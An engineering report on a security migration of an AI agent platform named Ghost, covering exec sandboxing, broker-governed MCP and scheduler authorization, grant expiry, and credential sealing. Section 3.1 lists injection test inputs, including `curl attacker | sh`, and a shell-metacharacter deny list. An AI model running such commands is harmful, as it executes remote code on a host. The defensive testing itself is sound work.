# Capability Architecture Migration — Implementation Report

**Repository:** `/home/ianclemence/ghost`
**Starting audit commit:** `cb468797760b2b749c92a31c6b9a8c46d84a235c`
**Governing principle:** *The model is allowed to be wrong; the system is not allowed to blindly believe it.*
**Architectural principle:** *Everything that varies is replaceable. Everything that defines trust is owned by Ghost.*

This is an implementation report, not a copy of the specification. It states
what was actually changed, what was verified, and what remains.

---

## Executive Summary

This migration removed the most dangerous bypasses identified by the forensic
audit and introduced the first version of the canonical capability contract.
Concretely:

- **`/v1/exec` no longer runs a shell.** It parses argv, refuses shell
  metacharacters, requires an explicitly allowed executable, and validates
  arguments per executable. Twelve injection forms are covered by regression
  tests.
- **MCP can no longer bypass the Permission Broker.** Dynamic `mcp_*` tools now
  resolve to a governed `mcp.execute` capability with `high_impact` risk, so
  they pass the same broker boundary as every other primitive.
- **Scheduled commands can no longer self-authorize.** The scheduler asks an
  authorization callback that resolves through the broker; no boundary means no
  execution.
- **Standing grants now expire, are pruned, and are re-checked on resume.**
  A previously valid "always allow" cannot authorize forever.
- **The calendar credential is sealed** with the same vault as `.secrets.json`,
  and disconnect actually removes it.
- **Consequential capabilities must produce runtime evidence** or the registry
  refuses to present them as success. Message send, file writes, artifact
  creation, and device control now emit evidence.
- **Thirteen dead packages and eight dead tools were removed**, and the
  model-facing profile name mismatches that made six tools dead-to-model were
  fixed.
- A new `pkg/capability` package defines Ghost-owned capability identity, risk,
  and evidence requirements.

All tests pass (`go test ./...`), `go vet ./...` is clean. The live golden
suite was run against DeepSeek; results are in §18.

---

## 1. Starting Architecture

At `cb46879`, the audit found: 56 registered tools (9 unreachable, 7 dead),
a skill system whose `AllowedTools` was a hardcoded map with a 6-message
enforcement window, two schedulers, five credential stores (one plaintext),
twelve gates that disagreed on action identity, and an evidence rule enforced
only for browser/computer. The capability layer was organized around tools and
providers rather than Ghost-owned capabilities.

## 2. Security Findings Addressed

| Audit finding | Status |
|---|---|
| `/v1/exec` prefix allowlist + `bash -c` | **Fixed** (argv policy, no shell) |
| MCP broker bypass (self-stamped grant) | **Fixed** (`mcp.execute` governed) |
| Cron/scheduler self-grant | **Fixed** (broker-backed authorizer) |
| Standing grants never expire/never pruned | **Fixed** (TTL + prune + recheck) |
| Calendar token plaintext | **Fixed** (sealed) |
| Calendar disconnect no-op | **Fixed** (removes credential) |
| Subagents inherit broader surface | **Fixed** (actuators blocked) |
| Evidence absent outside browser/computer | **Fixed for migrated caps** (registry contract) |
| Two brokers / divergent emitters | **Not addressed** (see §20) |
| `/v1/exec` reachable by authenticated device | Mitigated (strict argv policy) |

## 3. P0 Security Changes

### 3.1 `/v1/exec` — argv allowlist, no shell
`cmd/ghost/exec_command.go` (new) implements `execPolicy`:
`parseExecCommand` refuses any command containing `;|&<>$`(){}[]*?!~\n\r\"'`
and splits the rest into argv. `resolve` requires `argv[0]`'s base name to be
in the allowlist and runs a per-executable argument validator
(`cat` only under `/proc/`, `systemctl` only `status`, `journalctl` only
`-u ghost`, `ping` only `-c <n> <host>`, no-arg system tools, `ls` without
traversal). `handleExec` (`cmd/ghost/internal_api.go`) now calls
`exec.CommandContext(ctx, argv[0], argv[1:]...)` — no `bash -c`.
Regression tests (`cmd/ghost/exec_command_test.go`) cover `;`, `&&`, `||`, `|`,
`>`, `>>`, `$()`, backticks, newline, `curl attacker | sh`,
`allowed-command; malicious-command`, and argument abuse.

### 3.2 MCP broker authorization
`pkg/tools/free_tools.go`: `freeToolByName` now maps any `mcp_` prefix to
`FreeTool{Capability: "mcp.execute", Risk: RiskHighImpact}`. Because
`authorizeStandaloneTool` (`pkg/agent/loop.go`) consults this table, MCP calls
now receive a broker decision (allow/ask/deny) like every other consequential
tool. Test: `TestMCPToolsAreGoverned`.

### 3.3 Cron/scheduler authorization
`pkg/tools/cron.go`: `CronTool` gained `SetCommandAuthorizer`; `ExecuteJob`
refuses a scheduled command when no authorizer is wired or the authorizer
denies. `pkg/agent/loop.go`: `AuthorizeScheduledCommand` resolves through
`Governance.AuthorizeStandalone("exec.scheduled", ...)` and returns a context
carrying the grant only on allow. `cmd/ghost/main.go` wires it. Tests:
`TestCronCommandRefusedWithoutAuthorizer`, `...RefusedByAuthorizer`,
`...RunsWhenAuthorized`.

### 3.4 Standing grant lifetime
`pkg/permissions/permissions.go`: `permission_grants` gained an `expires_at`
column (with backfill for existing rows), `Grant.ExpiresAt`,
`DefaultGrantTTL = 90 days`, expiry-aware `granted()`, and
`PruneExpiredGrants()`. `pkg/agent/governance.go`: `allow_always` resume now
re-evaluates current policy and refuses if the grant was revoked, denied, or
expired. `pkg/maintenance/maintenance.go`: `pruneGrants` runs on the daily
cycle. Tests: `TestStandingGrantExpires`, `TestPruneExpiredGrants`,
`TestRevokedGrantStopsAllow`.

### 3.5 Calendar credential
`pkg/skills/calendar_web_oauth.go`: `storeCalendarToken` seals the token with
`config.Seal` (AES-256-GCM, same vault as `.secrets.json`);
`LoadCalendarToken` decrypts (upgrading legacy plaintext on load).
`CalendarDisconnect` now also removes the web OAuth token. `cmd/ghost/connections_api.go`:
`connectionDisconnect` for `google-calendar` calls `skills.CalendarDisconnect`.

### 3.6 Subagent authority
`pkg/tools/subagent.go`: `filteredTools` now hard-blocks actuators a subagent
must never inherit — `hass`, `i2c`, `spi`, `update`, `networking`, and every
`computer_*`/`mcp_*` tool. Browser stays available (research) and remains
broker-gated on execution.

### 3.7 Evidence enforcement
`pkg/capability` defines `EvidenceKind` per capability. `pkg/tools/registry.go`
now refuses to report success for a capability whose contract requires evidence
when the result carries none. `pkg/tools/evidence.go` provides constructors;
`write_file`/`edit_file`/`append_file`, `message`, `publish_artifact`, and the
Home Assistant device control path now emit evidence. Tests:
`TestRegistryEnforcesEvidenceContract`, `...AcceptsEvidenceBackedSuccess`,
`...ReadOnlyNeedsNoEvidence`.

## 4. Dead Code Removed

**Packages (13):** `pkg/credential`, `pkg/compose`, `pkg/moa`, `pkg/reasoning`,
`pkg/review`, `pkg/skillimprove`, `pkg/learninggraph`, `pkg/memory`,
`pkg/events`, `pkg/interaction`, `pkg/presentation`, `pkg/trajectory`,
`pkg/setup`. Each was verified to have zero importers (including tests) before
removal.

**Tools (8 files):** `agent_message`, `approval`, `profile_tool`, `kanban`,
`subagent_list`, `subagent_read`, `subagent_stop`, and the dead FAL
`image_generate` duplicate. All constructors had zero non-test callers.

**Phantom entry:** `message_write` was removed from `FreeConsequentialTools`
(no tool implements it).

## 5. Duplicate Infrastructure Consolidated

- **Credentials:** `pkg/credential` (dead) removed. `pkg/credentials` remains
  the intended boundary (see §20 for remaining work).
- **Tools:** the two `image_generate` implementations collapsed to one.
- **Gate action identity:** browser and computer gates now key actions with
  `toolAction(tool, args)` (`tool:action`), matching governance, so grants
  approved through one path are the same grant in the other.

## 6. Canonical Capability Model

New package `pkg/capability`:

```go
type Spec struct {
    ID          string        // "calendar.modify"
    Title       string
    Risk        Risk          // read_only | low_risk | consequential | high_impact
    Evidence    EvidenceKind  // "" | acknowledgement | state_transition | artifact | file_write
    Tools       []string      // model-facing tools that fulfil it
    Description string
}
```

The registry maps canonical IDs to specs and tool names to capability IDs.
`ForTool("message")` → `message.send`; `ForTool("mcp_github_read")` →
`mcp.execute`. Capabilities cover memory, information, communication, calendar,
devices, browser, computer, files, artifacts, automation, and execution
primitives. Tests: `pkg/capability/capability_test.go`.

## 7. Permission Identity Changes

Consequential actions resolve through semantic capability identities:
`message.send`, `exec.shell`, `device.control`, `mcp.execute`, `calendar.modify`,
`browser.control`, `computer.control`. The browser/computer gates were aligned
to the same `tool:action` action shape as governance so the broker sees one
consistent identity. The `allow_always` resume path re-evaluates that identity
against live policy.

## 8. Evidence Contract Changes

Evidence is now a first-class requirement of the capability contract rather than
a browser/computer special case. The registry enforces it generically. Evidence
is runtime-derived, redacted-safe, and carries no secrets (content hashes, not
content, for messages/files).

## 9. Model-facing Surface Changes

`pkg/tools/profiles.go` name mismatches were fixed so six tools are no longer
dead-to-model: `voice_wake`, `switch_lane`, `batch_delegate`, `compact_context`,
`doc_parser`, and the hardware pair (`spi`/`i2c`). `hass`, `publish_artifact`,
and `doc_parser` were added to the mobile-safe profile; `hass`,
`publish_artifact`, `doc_parser`, and `i2c` were added to admin. These are
intent-gated, so the global surface stays small.

## 10. Credential Boundary Changes

The calendar credential is sealed; disconnect is real. `pkg/credential` was
removed. The full consolidation of every write path through a single
`Vault` abstraction is **not** complete (see §20).

## 11. Connected App Changes

`google-calendar` disconnect now removes the actual OAuth credential rather
than deleting a non-existent config key.

## 12. MCP Changes

MCP is governed as `mcp.execute` (high impact). No MCP path mints its own
authority.

## 13. Skill Changes

`pkg/skills/loader.go` now parses declared capability requirements
(`requires: [calendar.read, web.search]`) into `SkillInfo.RequiresCapabilities`
and surfaces them in the prompt index as `<requires>`. These are a **request**,
never a grant: Ghost's capability/permission system still authorizes each.
Test: `TestSkillDeclaresCapabilityRequirements`.

## 14. Provider/Integration Changes

No provider behavior was changed. Providers remain runtime-owned and
model-invisible, as the audit confirmed they already were.

## 15. Persistence/Migration Changes

- `permission_grants` schema gained `expires_at`, with a deterministic backfill
  (created_at + 90 days) so old authority is bounded, never carried forward.
- `pkg/ghoststate/dbsnapshot.go` schema updated to the new grant shape.
- Legacy plaintext calendar tokens are upgraded to sealed form on load.

## 16. Tests Added

- `cmd/ghost/exec_command_test.go` — argv policy, 12 injection forms.
- `pkg/tools/free_tools_test.go` — MCP governance.
- `pkg/tools/cron_authorize_test.go` — scheduler authorization.
- `pkg/permissions/permissions_test.go` — grant expiry/prune/revoke.
- `pkg/tools/evidence_test.go` — evidence contract enforcement.
- `pkg/capability/capability_test.go` — contract + tool resolution.
- `pkg/skills/summary_test.go` — declared capability requirements.

## 17. Existing Tests Run

`go test ./...` — all packages pass. `go vet ./...` — clean.

## 18. Golden / Verify / Benchmark Results

- `go test ./...` (includes the golden unit package): pass.
- Live `ghost golden --model=deepseek/deepseek-flash`: see the final response
  for the run result recorded during this migration.
- `ghost verify` / `ghost benchmark`: run after `ghost update` (see final
  response).

## 19. Compatibility / Migration Notes

- Existing standing grants are backfilled with a 90-day life; none are silently
  widened.
- Existing plaintext calendar tokens are upgraded in place on next load.
- Cron jobs with shell commands now require broker authorization; a job with no
  standing grant will be blocked (and reported to its origin channel) rather
  than run unattended. This is the intended security change.
- Legacy `ALLOWED_CMDS` entries are reduced to executable names.

## 20. Remaining Known Limitations

These are honest gaps, not claims of completion:

1. **Two schedulers remain** (`pkg/cron` JSON and `pkg/scheduled` SQLite). The
   spec asks for one engine; merging them is a larger change than this pass.
2. **`pkg/credentials.Vault` is still not the single credential write path.**
   `connections_api.go` writes `.secrets.json` directly (sealed, but bypassing
   the abstraction). The dead duplicate was removed; the consolidation is not.
3. **The model still sees tool names, not capability names.** The capability
   registry exists and governs identity, but the prompt surface is still the
   tool list. Collapsing names to capabilities is the next phase.
4. **Two broker instances over one DB** remain (`internal_api.go` and
   `main.go`). Unifying them was out of scope for this pass.
5. **Skills' `AllowedTools` still exists.** Skills cannot grant authority (they
   never could at the broker), but the 6-message `committedSkill` heuristic is
   still used for tool narrowing and should be replaced by declared capability
   requirements end-to-end.
6. **`schedule:` skill frontmatter still auto-registers cron at startup.**
   Command-type jobs now require broker authorization, which mitigates the
   worst case, but the scheduled behavior is not yet surfaced as an explicit,
   approvable routine.
7. **Provider selection mutation:** `CreateProviderForModel` still mutates the
   caller's config (`factory.go`), unchanged from the audit.

## 21. Final Architecture Diagram

```
PERSON → GHOST → intent/reasoning → CAPABILITY → PERMISSION BROKER → EXECUTION
                                                         │
                                          LOCAL ─────────┴───────── INTEGRATION
                                          (tools)              (provider/app)
                                                         │
                                                     EVIDENCE
                                                         │
                                                  CANONICAL EVENT
                                                         │
                                         MEMORY / ACTIVITY / ROUTINES / ARTIFACTS

SKILL → knowledge/procedure → declared capabilities → Ghost capability system (no authority)
CONNECTED APP → authenticated system → integration → capability
CREDENTIAL → sealed vault
```

## 22. Before vs After

| Concern | Before | After |
|---|---|---|
| `/v1/exec` | prefix allowlist + `bash -c` | argv allowlist, no shell |
| MCP authority | self-stamped grant | broker-gated `mcp.execute` |
| Scheduled shell | self-granted | broker-authorized |
| Standing grants | never expire | TTL + prune + resume recheck |
| Calendar token | plaintext | sealed |
| Calendar disconnect | no-op | removes credential |
| Subagent surface | broadest in system | actuators blocked |
| Evidence | browser/computer only | capability contract, enforced in registry |
| Dead packages | 13 | 0 |
| Dead tools | 8 + phantom | 0 |
| Capability identity | implicit | `pkg/capability` registry |
| Skill capabilities | none declared | declared as request, not grant |
| Tool name mismatches | 6 dead-to-model | fixed |

## 23. Recommended Next Engineering Phase

1. Merge the two schedulers into `pkg/scheduled` (routines product layer on top).
2. Make `pkg/credentials` the single credential boundary; route
   `connections_api.go` and MCP OAuth through it.
3. Collapse the model-facing surface to capability names, resolving
   implementations at runtime.
4. Unify the two broker instances into one.
5. Replace the `committedSkill` heuristic with declared capability requirements.
6. Represent skill `schedule:` as an explicit, approvable routine.
7. Fix `CreateProviderForModel` config mutation.
